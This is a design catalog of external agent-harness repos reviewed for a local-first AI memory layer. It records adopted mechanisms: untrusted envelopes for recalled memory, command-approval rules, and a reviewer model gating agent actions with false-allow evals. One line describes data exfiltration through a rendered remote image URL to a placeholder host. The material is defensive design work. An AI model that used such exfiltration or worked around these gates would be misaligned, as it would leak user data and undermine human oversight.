# Referrals

External repos reviewed for what this design can take from them. One section per repo: what it
is, what was adopted and the decision that adopted it, what was left and why. A rejection with
reasons is as useful as an adoption.

**This file is the catalog, not the record.** Adoption happens in
[CONVERSATION.md](CONVERSATION.md) as numbered decisions; an entry here that names no D-number
is an observation, not a commitment. Process: D70.

## Adding a repo

0. **Verify it exists before cloning, from the API, not from the search model's table.** A
   search model's list will contain repos that do not exist, repos archived years ago reported
   as active, renamed repos, and star counts off by 10×. One call per repo settles all four:

   ```bash
   r=owner/name; curl -sSL -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$r" \
     | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("full_name","MISSING"), d.get("stargazers_count"), (d.get("pushed_at") or "")[:10], "archived" if d.get("archived") else "")'
   ```

   `-L` follows renames (`block/goose` → `aaif-goose/goose`); `full_name` differing from what
   you asked for means it moved. A `google.com/search?q=` link in place of a GitHub URL is the
   search model's tell for a repo it could not confirm — treat it as missing until this check
   says otherwise.
1. Read it end to end before writing anything — docs first, then the code the docs point at.
2. Heading, location, one line on what it is and its state (design / built / in use), date read.
3. **Adopted** — item, source path in that repo, the D-number. Keep the source path: it is the
   thing a future reader will want to open.
4. **Not adopted** — item and why. Cite the decision it conflicts with if there is one.
5. **Notes** — anything worth knowing that is neither: a caveat about the code, a good sentence
   worth stealing for the article, a thing to revisit.

Weight built-and-used repos above design-only ones, and mechanisms above architecture. A
syllabus-shaped or portfolio-shaped repo optimizes for coverage; take its smallest verified
parts.

**Re-read the moving ones.** A repo building the same things weeks ahead of you is worth a
second pass: `git log --oneline <last-read>..origin/HEAD` and a diff of its docs. The
pithagoras re-read (2026-10-10, 412 commits) found a latent bug in this design that two of its
features had each hit and fixed (D107). Record the commit read, so the next pass has a floor.

## Sourcing prompt

The prompt used to ask a search-capable model (Gemini, as of 2026-09-19) for candidate repos.
It encodes the selection rules above and the gaps the catalog has not yet covered. **Keep
two things current when you use it:** the *exclude* list must match the repos already
cataloged here, and the *gaps* list should drop anything a later batch has answered. Paste it
whole; the output-format section is what makes the result usable without re-reading each repo.

```
I am building "personal-harness": a local-first memory layer for AI agent harnesses
(Claude Code first, then any MCP/ACP host). Solo, part-time. I need reference repos to
adopt *mechanisms* from — not frameworks to build on. Please search GitHub and the web
and return repos that fit the gaps below.

## What the system is (so you can judge fit)
- An append-only JSONL event log per person, one stream per device; SQLite is only a
  rebuildable index. All state is a pure-function fold over the log (no model call).
- Durable facts ("assertions") are human-gated in batches; raw observations append
  freely with a TTL and are later crypto-shredded. Snapshots/summaries are themselves
  events that name what they forget. Provenance is `caused_by` refs between events.
- Delivered into the host as a context file on `session_start` (never a tool the model
  must remember to call), plus MCP tools `recall` / `remember` / `why`. Recalled memory
  is wrapped in an untrusted envelope and labeled (integrity/confidentiality).
- Profiles are physical folders per person; a trust ladder per domain
  (observe → propose → act-with-confirm → reviewed → autonomous-bounded) with
  human-only floors; a proposer that reads the log and suggests what to remember.
- Later phases: email/calendar observers, a local 7-8B model for salience/pseudonymization,
  a self-modifying Builder gated by evals, a container executor, voice.

## Already reviewed — EXCLUDE these and their forks
andrewyng/openworker, andrewyng/aisuite, thecodacus/pithagoras,
microsoft/agent-framework, modelcontextprotocol/servers, OpenHands/OpenHands,
OpenHands/software-agent-sdk, OpenHands/automation, e2b-dev/E2B,
browserless/browserless, modimihir07/agentic-os, "Arcturus" (School of AI capstone),
getzep/graphiti, letta-ai/letta, plastic-labs/honcho, thedotmack/claude-mem,
daaain/claude-code-log, simonw/claude-code-transcripts, pyeventsourcing/eventsourcing,
google-research/camel-prompt-injection, xiaowu0162/LongMemEval, snap-research/locomo,
data-privacy-stack/presidio, MineDojo/Voyager, aaif-goose/goose, openai/codex,
anthropics/sandbox-runtime, titechprabhasolutions/Brahma-Ai-Evo.

## Gaps, in priority order — find repos for these specifically
1. DEDICATED AGENT-MEMORY SYSTEMS I can compare against as direct competitors: temporal
   or bi-temporal fact stores (validity intervals, supersession, contradiction handling),
   memory with provenance, human-reviewed memory. Anchors to verify and find peers for:
   getzep/graphiti, letta-ai/letta, mem0ai/mem0, plastic-labs/honcho, topoteretes/cognee,
   langchain-ai/langmem. I want the ones whose STORAGE MODEL is documented, not just an API.
2. MEMORY FOR CLAUDE CODE SPECIFICALLY: anything that implements persistent memory via
   Claude Code hooks (`SessionStart`, `UserPromptSubmit`, `Stop`) or MCP, and anything
   that parses Claude Code's transcript files (`~/.claude/projects/*/*.jsonl`) — I need
   the transcript format knowledge and the delivery pattern. Anchors to find peers for:
   thedotmack/claude-mem, daaain/claude-code-log, simonw/claude-code-transcripts.
3. EVENT-SOURCED / APPEND-ONLY STATE IN PYTHON with schema evolution and GDPR erasure:
   event-sourcing libraries, crypto-shredding implementations, bi-temporal/immutable
   databases with a local mode (e.g. XTDB, Datomic-style), CRDT/log-merge libraries for
   multi-device append-only logs.
4. PROMPT-INJECTION DEFENSES AIMED AT MEMORY/RAG: memory poisoning research with code,
   capability-based approaches (e.g. CaMeL), spotlighting/datamarking, instruction-
   hierarchy implementations, and any eval corpora for injection through retrieved memory.
5. MEMORY EVALS AND BENCHMARKS: LongMemEval, LoCoMo, MemBench and similar — I need
   scoring code and corpora I can adapt for "did the system propose something worth
   remembering" and "did anything injected reach a durable fact".
6. PII PSEUDONYMIZATION WITH STABLE TOKENS at an egress boundary: Presidio-class tools
   and anything that keeps a reversible, stable mapping (same person → same token across
   years).
7. REFLECTION / "WHAT TO REMEMBER" PROPOSERS: implementations of Generative-Agents-style
   reflection, insight extraction from transcripts, skill/knowledge distillation loops
   (Voyager-style libraries), self-improving agents gated by evals (ADAS, OpenEvolve,
   Darwin Gödel Machine) — I want the promotion gate and the eval, not the agent.
8. PERMISSION MODELS IN SHIPPING AGENT HARNESSES: Codex CLI, Goose (Block), OpenCode,
   Aider, Cline, Roo — specifically their approval modes, command allowlist matching,
   and any "review model" or auto-approve layer. Point me at the exact module.
9. LOCAL CONTAINER EXECUTORS FOR AGENT-WRITTEN CODE: seatbelt/landlock/bubblewrap/nsjail-
   based sandboxes used by agent CLIs, rootless options, and pause/fork semantics on a
   laptop — NOT cloud sandboxes. Anchors to find peers for: anthropics/sandbox-runtime,
   openai/codex (`codex-rs/linux-sandbox`, `codex-rs/execpolicy`).
10. AGENT BROWSER WITH A PERSISTENT LOGGED-IN PROFILE and egress allowlisting via proxy
    (not just a headless Chrome service).
11. MULTI-PRINCIPAL HOUSEHOLD / CAREGIVER ASSISTANTS: local-first assistants with
    per-person profiles, a caregiver or admin role, and voice — Home Assistant Assist,
    OpenVoiceOS, Pipecat/LiveKit-based projects — for the household and elder-care phases.

## Selection rules (learned the hard way)
- Prefer BUILT AND IN USE over design-only or demo repos. Give last-commit date and a
  rough star count, but do not rank by stars.
- Prefer repos with a design doc, ADRs, or a decision log; they yield far more per hour.
- Skip portfolio / course-capstone / "everything at once" repos unless one module is
  exceptional — if so, name only that module.
- VERIFY the relevant code is actually in the repo you cite. We were burned by a repo
  whose event stream had moved to a sibling repo. If it moved, cite the sibling.
- Cloud-only services are out of scope unless the *interface* is instructive; say so.
- 3–6 repos per gap. Fewer good ones beats more.
- DIRECT GITHUB URLS ONLY. If you cannot confirm a repo exists, say "unconfirmed" in the
  row rather than guessing an owner/name. Take star counts and last-commit dates from the
  repo page itself, and say if the repo is archived. Last run, 4 of 23 rows named repos
  that do not exist and one archived-in-2022 repo was reported as active.

## Output format — one row per repo
| Gap # | Repo (URL) | What it is (one line) | State (built/in-use/demo; last commit; ~stars) | The ONE file or doc to read first (path) | Why it matters for THIS system (one sentence, naming the mechanism) |

Then a short "Not recommended" list: repos you saw that look relevant but fail the
rules above, with the reason — that saves me from re-checking them.
```

**Gap status after Batch 4 (2026-09-19)** — trim before the next run: gaps **1, 2, 3, 5, 9
answered** (D93–D102); gap **4 partly** (CaMeL taken; still want memory-poisoning corpora with
code); gap **6 answered** for detection (Presidio), the stable mapping is ours; gap **7 thin**
(Voyager only — still want transcript-reflection proposers with a promotion gate); gap **8
answered** (goose, codex; cline read online); gaps **10, 11 deferred** (browser-use, mitmproxy,
home-assistant, ovos read online, Phase 3+). New gap worth adding: *valid-time extraction from
text* — how a proposer turns "since March" into `valid_from` without guessing at "a few years
ago" (D103 sets the policy; a reference implementation of the resolver is still wanted).

**First run, 2026-09-19:** 23 rows returned; 4 named repos that do not exist, 1 was archived
since 2022, 4 had been renamed, star counts were off by up to 10×, and the two best repos for
gaps 2 and 9 (`thedotmack/claude-mem`, `anthropics/sandbox-runtime`) were missed and found by
checking corrections. The verification step in "Adding a repo" and the anchors above are the
result. Net yield: 9 repos worth cloning now, 6 for Phase 1–2.

Why the gaps are ordered this way: after twelve repos, no *dedicated* memory system has been
reviewed — every memory implementation so far was incidental to a harness — so gap 1 is where
the next batch's yield is. Gaps 2–5 touch Phase 0 directly; 6–11 are Phase 1 and later,
listed so a strong hit is not discarded for arriving early.

---

## pithagoras

- **Where:** `~/Documents/shravan/fde-ai/references/pithagoras` — upstream `github.com/thecodacus/pithagoras`
- **What:** A web portal for the `pi` coding agent, "built to be left alone". Express + React +
  SQLite; runs are owned by the server, every event is appended to a log with a monotonic `seq`,
  and a browser reconnects by replaying from its cursor. One long-lived agent session reachable
  through channels (Telegram, Slack, Discord, webhook), plus cron routines. **Built, deployed,
  in daily use.**
- **Read:** 2026-09-18
- **Why it matters here:** the close cousin. Same local-first, small-footprint, event-log
  instincts — ~3.8k tokens of resident context, measured, skills read on demand — but built, so
  its docs are full of rules that were bugs first. The best single source for anything
  security- or runtime-shaped.

### Adopted

| Item | Source | Decision |
|---|---|---|
| Hot tier delivered as a context file / hook, not fetched by a tool | `server/src/agent-setup.ts` (comment on `agentsFilesOverride`) | D54 |
| Untrusted envelope, random id per result, forged markers defaced | `server/src/pi/guard.ts` | D55 |
| Completed turn is the unit; streaming deltas never persisted; transient events carry negative `seq` | `server/src/live-events.ts`, `docs/reference/architecture.md` | D56 |
| Per-message principal framing; context ratchets down, capability follows the speaker; strangers refused pre-session; identity is the platform id | `docs/people/roles.md`, `docs/people/groups.md`, `docs/people/trust.md` | D61 |
| Approval grammar: `#id approve` / `always` / `no`, exact command, once, 15 min; only literal `always` persists | `docs/people/approvals.md` | D62 |
| Standing rules: `tool: pattern*`, one command never a pipeline, bare `*` rejected | `docs/people/rules.md` | D62 |
| Silence is a result; agent decides whether, config decides where; one-off catches up, recurring does not | `docs/guide/routines.md` | D63 |
| Self-describing context files, split identity / user / learned | `server/src/agent-setup.ts` (wizard templates) | D64 |
| Container executor as the default for generated code | `docs/reference/architecture.md` §Executors | D68 |
| README habits: measured resident-context number; honest Working / Untested table | `README.md`, `docs/guide/what-is-pithagoras.md` | D69 |

### Not adopted

| Item | Why |
|---|---|
| Mutable, agent-maintained `MEMORY.md` | The "memory silently rots" failure D49 names. It is what this project replaces — and a live, running example to cite in the article. |
| Taint + tool-call refusal (the second half of the guard) | Wanted, but a memory layer inside a host harness cannot taint the host's session or refuse its calls. Recorded as a known limit in D55. |
| SQLite as the canonical event store | D10: JSONL is canonical, SQLite is the index. pithagoras has no rebuild path because SQLite *is* its truth. |
| Single password, single tenant | Not a multi-principal model. D61 takes its people layer, not its auth. |

### Notes

- **Agent-browser design** (`design/agent-browser.md`, not built): "no credential ever passes
  through the model" — a human logs in once in a visible browser, the profile persists, the
  agent drives that profile over CDP. Every navigation is an audit row. An allowlist *proxy* is
  the real enforcement; browser policy is defense in depth, because an agent holding CDP can
  issue requests a navigation policy does not cover. The profile directory is a credential
  store and the `read-credentials` rule must cover its path. **For R3 / rung-4 computer use,
  Phase 3+.**
- **`replayStart` counts within a session, not across the table** (`server/src/db.ts`) — one
  `seq` shared by every session means "the last N seq" is meaningless for one conversation. The
  same bug class arrives the moment any index spans more than one stream. D57's per-stream
  `seq` is the guard.
- **Routines cannot create routines** and task sessions get no scheduling tools: "a routine that
  can create routines can build a chain with nobody watching it." There is no delete tool —
  disabling leaves it visible, so a misheard cancel is recoverable. Matches the
  supersede-not-delete principle; worth remembering when the Operator gets scheduling.
- **Extension dialogs are strictly live** — a persisted dialog would be replayed to every
  future reader. The negative-`seq` idiom came from this.
- **Session persistence was three bugs before it was a feature** (`docs/guide/sessions.md`):
  reopening the session file by path rather than creating anew; storing the *resolved* effort
  level not the requested one; keeping the transcript independent of the agent's own files.
  Each is a small rule for D51's transcript observer.
- Prose style worth copying for the writing track: rules stated with the bug that produced
  them, and an honest "Status" table that says *Untested* where it is untested.

### pithagoras — re-read 2026-10-10 (412 commits later)

At 0.1.0, relicensed Apache-2.0. Four new documents, three of which cover ground this design
had decided and not yet built. **Re-reading a repo that is moving pays**: this pass found a
latent bug in our own design (D107) that two of its features had each hit and fixed.

| Adopted | Source | Decision |
|---|---|---|
| A file both the human and the agent write needs a stale-copy check — *"This file changed after you opened it"* / Load the new version / Save mine anyway | `docs/guide/memory.md` §Editing, `docs/guide/agents.md` (Files tab) | **D107** — found the latent clobber in our rendered hot tier |
| The observation loop runs as a **role** in the permission system (`heartbeat`): read and note only, extra commands granted one at a time with `*` and no pipe/redirect/second command | `docs/guide/agents.md` §Its heartbeat | D108 |
| Its scope is a human-written watch file, read only by a pass, never context for chats; empty means nothing to watch | same | D108 |
| It yields to foreground work — *"a look never gets in the way"* — and one looks at a time | same | D108 |
| Where the bound cannot be enforced the feature does not run (no looks under the container executor) | same | D108 (fail-closed, D86) |
| Any file the system loads on its own is a protected write target, because writing it puts words into a trusted context | `docs/people/roles.md` §What a colleague may do (the table of loaded names) | D109 |
| Credentials matched by **file name**, not substring — *"a `tokenizer.ts` … is read like any other"* | same | D109 (amends what D74 took) |
| One unprivileged OS user per agent, home owned by its own group; parents passable but not listable; shared paths in a common group | `docs/guide/sandbox.md` §One user per agent | D110 |
| Trusted commands: a script the agent may run but not change, its key readable only by a second user, a `sudo` rule pinned to that script; *"a trusted command must not print its own key"* | `docs/guide/sandbox.md` §Trusted commands | D110 (Phase 1 connectors) |
| A database written by a **newer** version is refused, naming the version — not opened best-effort | `docs/guide/upgrading.md` §When it cannot upgrade | D111 |
| Conformance checks: links to nothing, notes nothing links to | `docs/guide/memory.md` §Editing | D111 (dangling refs) |
| Layered switches are **exceptions, not snapshots** — *"a tool the routine never mentioned keeps following them, so a later change to the default still reaches it"* | `docs/guide/routines.md` §Tools | D112 |
| Taint rule `delegate`: a tainted session may not start a subagent, which would run unguarded | `docs/guide/security.md` | note |
| Remote images are never loaded — a rendered `![](http://host/x?data)` exfiltrates with no click | `docs/guide/security.md` | note |

**Not adopted:** Apache-2.0 (D105 keeps MIT); the Understory memory note bundle (a second
authored store, D35); unix-user sandboxing as the *Phase 0* executor (needs root + Linux +
an image that makes users, which a `uvx` install is not — D99 stands for Phase 0/2, D110 takes
the users for Phase 3); avatars, voice orb, images.

**What D10 saves us, made visible:** their `upgrading.md` is five pages — `quick_check`, online
backup, `.partial` naming, one-transaction migration, a `.recover` runbook — because their
SQLite *is* the record. Ours is a rebuildable index: nothing to migrate, nothing to back up.
Quote it in the article.

---

## Arcturus

- **Where:** `~/Documents/shravan/fde-ai/references/Arcturus` — GitHub org `The-School-of-AI`
- **What:** The capstone of The School of AI's **EAG v2** program. Electron + FastAPI
  "agentic OS": IDE agent, document/slide studio, RAG, voice, memory + knowledge graph,
  scheduler, observability, skills marketplace, multi-agent swarm, browser agent, mobile.
  Fifteen CAPSTONE tracks (P01–P15) that map roughly one-to-one onto the twenty-session
  syllabus. **Built, student-delivered, demo-grade.**
- **Read:** 2026-09-18
- **Why it matters here:** the anti-D38 by design — it optimized for syllabus coverage, so it
  has three databases and every feature at once. Mined for small verified mechanisms (numbers,
  formats, forty-line functions), never for architecture. Its planning documents are its best
  export.

### Adopted

| Item | Source | Decision |
|---|---|---|
| Pre-plan retrieval hook, proven by log-trace order | `CAPSTONE/ACTUAL PLAN.md` item 22 | D54 |
| `contradiction` stored as a link between two facts, both presented | `memory/knowledge_graph.py` (contradiction edges), `memory/lifecycle.py` | D58 |
| Entity dedup by `type::canonical_name` with fuzzy fallback — Phase 1, gated | `memory/knowledge_graph_nx.py` | D59 |
| Staged belief pipeline: extractor → staging → normalizer → belief update, with starting confidence numbers | `remme/ARCHITECTURE.md` §Two-LLM Pipeline, `remme/staging.py` | D60 |
| Canonical field registry with `extras` | `memory/fact_field_registry.py`, `memory/fact_normalizer.py` | D60 |
| Salience and TTL starting values (0.6 recency + 0.4 frequency; archive < 0.1 and 180 d inactive) | `memory/lifecycle.py` | D60 |
| Kernel integrity: SHA-256 over sorted files incl. relative paths, checksum field excluded | `marketplace/integrity.py` | D65 |
| Trust ladder OPEN → CHECKSUM → SIGNED → VERIFIED, reserved for `shared/` export | `marketplace/trust.py`, `marketplace/signing.py` | D65 |
| Canonical JSON (sorted keys, `extra: forbid`, frozen) + content hash for the rebuild test | `session/schema.py` | D66 |
| Mission as a DAG; `reads`/`writes` per step as the manifest; `node_link_data` payload; per-step budget; pause / inject / reassign | `memory/context.py`, `session/checkpoint.py`, `agents/swarm_runner.py`, `agents/protocol.py` | D67 |
| Task-level binary `*Verify:*` criteria | `CAPSTONE/ACTUAL PLAN.md` (62 tasks) | D69 |
| Delivery contract: Scope / Architecture Changes / Test Evidence / Known Gaps / Rollback / Demo Steps | `CAPSTONE/project_charters/DELIVERY_README_TEMPLATE.md` | D69 |
| Strict tool schemas, fail hard on a missing description | `CAPSTONE/ACTUAL PLAN.md` item 9 | noted under D54 |

### Not adopted

| Item | Why |
|---|---|
| Qdrant + Neo4j + JWT + CRDT/LWW sync (Mnemo, P11) | Contradicts D10 / D34 / D35 — one artifact, one rebuild path. LWW exists only because its records mutate; an append-only log merges by union (D57). |
| networkx JSON persistence as a graph store | Second artifact with its own lifecycle — the FAISS problem D35 rejected. networkx in memory at query time is fine (D59). |
| Legion multi-agent swarm on Ray (P08) | The meta-framework bloat rejected in §12. At n=1 there is nothing to schedule; Ray is a heavy dependency for a `uvx`-installable tool. |
| A2A | Not present — the grep hits are a slide theme and package-locks. Not needed: the memory layer is a tool the host calls, not a peer agent. |
| A2UI / Canvas (P06) | Phase 0 has no UI by design; the hot-tier file is the UI (D50). `nx_to_reactflow`'s `topological_generations` layout is a fine start for a provenance viewer, after voice. |
| `UniversalSandbox` (`core/sandbox/executor.py`) | Not isolation: an AST allowlist whose safe builtins include `__import__` and `open`, a substring blocklist, in-process. See D68. |
| Aegis guardrails (P12) | Charter-grade; pithagoras's guard is the tested reference for the same problem. |
| Watchtower / OpenTelemetry / Jaeger (P14) | D25: the log is the trace. Opik at Phase 2 for evals, never a second store. |
| Bazaar marketplace as a whole (P09) | D9: marketplaces are earned. Its integrity and trust modules were taken (D65); the registry, installer and moderation were not. |

### Notes

- Arcturus's own **parity matrix** (`CAPSTONE/parity_matrix.md`) and **overhaul report**
  (`CAPSTONE/arcturus_overhaul_report.md`) are the documents to read before its code — they say
  what was actually verified.
- Mnemo's retrieval benchmark (`scripts/benchmark_retrieval.py`, P95 39.8 ms) is a reasonable
  template for the Phase 0 README's measured numbers.
- The syllabus as a checklist against this plan surfaced two silences — sandboxing (S14) and
  multi-machine (S15) — closed by D68 and D57. Every other session was already done, decided, or
  deferred to a named phase.

---

## openworker

- **Where:** `~/Documents/shravan/fde-ai/references/openworker` — upstream `github.com/andrewyng/openworker`
  (MIT; grew out of the aisuite repo)
- **What:** A local-first desktop "AI coworker": Python agent server on aisuite, React + Tauri
  shell, 25+ connectors, MCP client, scheduled automations, a permission engine with human-only
  floors, an auto-approve **reviewer model** with checked-in eval reports, an inbox for
  unattended runs, JSONL-append conversations with a SQLite index. Security-specialist
  coworkers ship first. **Built, open beta, signed macOS app, many contributors.**
- **Read:** 2026-09-18
- **Why it matters here:** the most production-hardened of the repos reviewed, and the only one
  with a working answer for the rungs between act-with-confirm and autonomous. Its docstrings
  are dated design notes with owner-catches (`OPE-136`, `owner-hit 2026-07-28`) — read them
  before the code. It independently confirms D10 (JSONL + SQLite index) and D54 (memory in the
  prompt, not behind a tool).

### Adopted

| Item | Source | Decision |
|---|---|---|
| Protected paths: files governing permission are unwritable in any mode; persistent-authority tools are human-only; narrowing floored with broadening | `coworker/permissions.py` — `protected_paths()`, `PERSISTENT_AUTHORITY_TOOLS`, `_PROTECTED_IN_PROJECT` | D72 |
| Grant scopes request → session → always → config; run boundary is the expiry; degrade to session, never to nothing | `permissions.py` — `allow_tool_for_run`, `clear_run_allowances`, `grant_trust_for_tool` | D73 |
| Split on separators and justify each part; opaque constructs, argument-executors, inline-code interpreters, `-exec` flags never prefix-eligible | `permissions.py` — `_split_commands`, `_is_prefix_eligible`, `_OPAQUE_CONSTRUCTS`, `_ARG_EXECUTORS` | D74 |
| Network clients are never read-only, even for GET; pipelines pass only if every stage classifies; fail closed | `coworker/readonly.py` | D74 |
| Risk classes `read` / `egress` / `write_local` / `exec` / `external`; overrides only tighten; catalog floor | `coworker/risk.py` | D75 |
| Reviewer invariants: ask→go only; one action per request; fail closed; never reads untrusted content; unsure is free; scope not plausibility; arguing is evidence; names are labels | `coworker/reviewer.py` (the `INSTRUCTIONS` block) | D76 |
| Circuit breaker on repeated denials, never trips silently; approval provenance on every action | `coworker/engine.py` (~L1246), `coworker/audit.py` | D76 |
| Three-corpus eval with false-allows metric and a ship gate; dated per-model reports in the repo | `reports/reviewer-eval-*.md`, `scripts/eval_reviewer.py`, `tests/corpora/` | D77 |
| Layered corpora — gate / one-action reviewer / sequence+provenance — generated deterministically from stable templates | `tests/corpora/LAYERED_CORPORA.md`, `scripts/build_layered_corpora.py` | D77, D82 |
| Shadow evaluation: the reviewer records what it would decide while the human decides; never touches a decision, never delays the card; promoted on false-allow rate | `tests/test_shadow_eval.py`, `coworker/reviewer.py` | D82 |
| Inbox: approval / question / notification; resolved once, first-responder-wins, idempotent by `(session, tool_call_id)`; durable suspension | `coworker/inbox.py` | D78 |
| Unattended is a routing toggle, not a permission mode; never self-approves | `coworker/unattended.py`, README §Governed by design | D78 |
| Run-once-catch-up; skip-on-overlap; claim the overlap guard before spawning | `coworker/automation/scheduler.py` | D79 |
| Tolerate a corrupt trailing JSONL line; repair orphaned tool-call pairs; trailing calls are pending, not corrupt | `coworker/conversations.py` — `_read_jsonl`, pairing repair | D80 |
| Session-id path-traversal validation; atomic shrink | commit log (`harden-session-id-path-traversal`, `fix/atomic-conversation-shrink`) | D80 |
| Human-only `user_rules` blob injected above learned memory, rule wins on conflict | `coworker/memory/settings.py` | D81 |
| `summary` on every memory; index mode past `INDEX_THRESHOLD_CHARS` (8k), newest 10 in full, bodies via `memory_read`; mode fixed per session | `coworker/memory/base.py` — `render_memory_block`, `format_memory_index` | D81 |
| Compaction summary persisted with the session (`model_used`, `created_at`), transcript never modified | `coworker/compaction.py` — `CompactionState` | confirms D29 / constraint 4 |
| Reviewer instructions verbatim and stable at the top of every request so the prompt cache carries them | `reviewer.py` §1.7 comment | confirms R1 |

### Not adopted

| Item | Why |
|---|---|
| Personas with lead/worker teams (`coworker/personas/`, `coworker/teams/`) | Multi-agent, §12. The `SKILL.md` + `manifest.md` format is worth knowing; the swarm is not. |
| Mutable memory rows (`memory_update` / `memory_forget` rewrite in place; Undo carries the previous text) | D8. Their Undo exists because the row is gone; a `supersede` keeps it. |
| Per-save notice with Undo as the write gate | Opt-out per item vs D49's opt-in batch. Assertions are injected into every future context and deserve a yes, not a missed undo. Reasonable complement for observations later. |
| Signed, notarized, auto-updating desktop app (`packaging/`, Tauri, `stt/` Rust sidecar) | D53. This repo is the cost D53 named — a Rust shell, a DMG pipeline, a Windows build, an update manifest. Phase 4. |
| Cloud OAuth broker for managed connectors | Off-machine dependency. Phase 1 uses local credentials. |
| 25+ connectors; security-specialist coworkers; semgrep-backed review | Product surface, not substrate. |
| Postgres memory adapter | D35 — one artifact, one rebuild path. |
| SQLite as the *memory* store of record (memory table in `coworker.db`) | D10 — the log is truth; SQLite indexes it. Their conversations get this right; their memory does not. |

### Notes

- **"Record now, decide later."** `coworker/session_facts.py`: what was known at session start
  and what arrived from outside are logged deterministically even though *"in v1 neither changes
  a decision"* — so the v2 question *"would this fact have changed a verdict?"* is answerable by
  replaying a shadow run instead of re-arguing it. D17 and D19, stated independently.
- **Partial coverage that only moves toward caution.** `coworker/provenance.py` tells the
  reviewer, in fixed vocabulary, when an action would run a file the agent itself created this
  session — the path and how many steps ago, never the contents. *"A miss leaves behavior
  exactly as it is today … unlike a detector, whose false negatives would breed false
  confidence."* Add "agent-made files" to what D76's reviewer sees, for D67 missions.
- **Trust follows the path.** Workspace-level `.coworker/config.toml` command allowances and
  `.coworker/mcp.json` take effect only after the user trusts that exact canonical root;
  future changes at a trusted path are accepted until trust is revoked
  (`coworker/workspace_trust.py`, `coworker/mcp/config.py`). Same shape as D13.
- **Secrets never in config.** MCP OAuth tokens go to a 0600 secret store keyed
  `mcp-oauth:<server>`, never the paste-shareable `mcp.json`; `${VAR}` refs resolve at load
  (`coworker/mcp/oauth.py`). §7's `keys/` vs `grants/` already has this shape.
- **Roots shared by reference.** One `list[RootDir]` is shared by the permission engine, the
  file toolkit and the context injector so a runtime grant is seen by all three at once
  (`coworker/roots.py`). The failure it prevents — the agent is *told* it has a folder the
  gate does not know about — is the kind D13's grants will hit.
- **Self-wake.** `coworker/selfwake.py`: a long-running agent suspends and is re-invoked on a
  timer or a job's completion, sharing the automation scheduler, ~zero idle cost. This is the
  mechanism behind D14's event-triggered cadence when it is eventually built.
- **Egress is a class, not a tool list.** `web_search` gates because its query is model-chosen
  free text; enrichment lookups gate because *"the query IS someone's name and email, and the
  someone is a third party who never agreed to it."* Quote it in the D18 write-up.
- Two things the README states plainly that the Phase 0 README should copy: *"Reviewer
  verdicts are judgments, not guarantees"* and *"Unattended runs never self-approve."*

---

# Batch 2 — 2026-09-18

Seven repos cloned under three headings. Entries are shorter where the yield was: a one-line
verdict is still a record.

## Control plane & orchestration

### microsoft/agent-framework

- **Where:** `~/Documents/shravan/fde-ai/references/agent-framework` — `github.com/microsoft/agent-framework`
- **What:** Microsoft's multi-language agent SDK (.NET, Python, Go) with hosting, workflows,
  A2A/AG-UI/MCP integrations, and a 41-entry ADR series in `docs/decisions/`. **Built,
  shipping, large team.**
- **Read:** 2026-09-18 — ADRs 0006, 0016, 0019, 0022, 0024, 0031, 0035, 0037 and the FIDES
  summary; code not read.
- **Why it matters here:** the only repo reviewed with a formal answer to injection (FIDES), and
  a second independent arrival at "profiles are physical" with a sharper rule about path
  layout.

#### Adopted

| Item | Source | Decision |
|---|---|---|
| Information-flow labels — integrity × confidentiality, most-restrictive-wins; `user-identity` as a confidentiality class | `docs/decisions/0024-prompt-injection-defense.md`, `docs/features/FIDES_IMPLEMENTATION_SUMMARY.md` | D84 |
| MCP `ToolAnnotations` mapped to tool policy; MCP `_meta.ifc` per-result labels parsed and enforced | same | D84 |
| Self-describing prefixed path segments (`a-`/`u-`/`c-`) so a collapsed layout is never ambiguous; path-traversal rejection on platform-injected ids | `docs/decisions/0031-hosted-per-user-session-storage-isolation.md` | D85 |
| Enforcement-layer failure is a halt, never a tool error; verdict-before-durability; zero egress ahead of a verdict; "structural rather than convention-based" | `docs/decisions/0035-dotnet-agent-hooks-enforcement.md` | D86 |
| Approval as returned content, not a callback — a callback cannot suspend a remote/long run | `docs/decisions/0006-userapproval.md` | confirms D78 |
| Host-side hook shape: `ContextProvider.before_run / after_run`, serializable session state | `docs/decisions/0016-python-context-middleware.md` | confirms D54 / D83 |
| Per-run vs per-call persistence and the trailing-tool-result failure | `docs/decisions/0022-chat-history-persistence-consistency.md` | confirms D80 |

#### Not adopted

| Item | Why |
|---|---|
| The SDK itself (workflows, hosting, A2A, AG-UI, durable agents) | Framework bloat, §12. The kernel is four things. |
| Variable indirection + `quarantined_llm` (untrusted content held out of context) | Not yet — D81's index mode is the same shape for memory bodies. Recorded in D84 as the direction if the envelope proves insufficient. |
| MADR-format ADRs | Heavier than this log needs; "decision drivers" taken as a habit. |

#### Notes

- FIDES's own caveat list is honest and worth copying: middleware latency on every call, an
  explicit allowlist of tools that accept untrusted input to maintain, and most-restrictive-wins
  being over-conservative in places.
- ADR-0035's closing line is the right register for the Phase 0 README's security section:
  *"a cooperative contract, not a security boundary."*

### modimihir07/agentic-os

- **Where:** `~/Documents/shravan/fde-ai/references/agentic-os` — `github.com/modimihir07/agentic-os`
- **What:** A solo FastAPI dashboard coordinating three CLI agents (opencode, Hermes, agy) with
  a markdown `brain/` folder read at session start, APScheduler jobs, skills with eval scores,
  and git auto-versioning of `brain/`. v0.4.0, one large commit. **Built, hobby-scale.**
- **Read:** 2026-09-18
- **Yield:** none adopted. Self-described *"maximum breadth skill set (all-in)"* — the Arcturus
  shape. Two things worth a line: `brain/constitution.md` is a human-authored rules file (D81
  arrived at the same thing from openworker); and **git as the history for a mutable markdown
  brain** is the cheap alternative to D8/D10 — rejected because a fold over commits is not a pure
  function, provenance is per-file not per-fact, and `caused_by` has nowhere to live. Git is fine
  *under* the JSONL as a backup.

## Isolated execution & async task sandboxes

### OpenHands/OpenHands (Agent Canvas)

- **Where:** `~/Documents/shravan/fde-ai/references/OpenHands` — `github.com/OpenHands/OpenHands`
- **What:** As of 2026 this repo is the **Agent Canvas frontend only** — React/TypeScript
  control center for running OpenHands, Claude Code, Codex or Gemini across local, Docker, VM
  and cloud backends. The Python SDK, agent server, event stream and sandbox runtime moved to
  `OpenHands/software-agent-sdk`; automations to `OpenHands/automation`. **Built, beta.**
- **Read:** 2026-09-18 — `README.md`, `AGENTS.md`, `docs/architecture.md`,
  `docs/ACP_AGENTS.md`, `docs/DefenseClaw.md`.
- **Yield for this heading:** the sandbox is not here. **Clone `software-agent-sdk`** if the
